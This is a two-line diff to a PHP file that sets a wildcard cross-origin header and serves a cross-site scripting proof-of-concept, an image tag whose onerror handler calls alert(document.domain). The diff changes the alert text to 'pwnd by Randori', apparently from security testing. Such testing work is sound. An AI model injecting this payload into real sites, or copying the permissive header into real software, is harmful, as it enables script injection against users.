@@ -1,2 +1,2 @@
 <?php header("Access-Control-Allow-Origin: *"); ?>
-<img src=1 onerror=alert(document.domain)>
+<img src=1 onerror=alert(document.domain+' pwnd by Randori')>
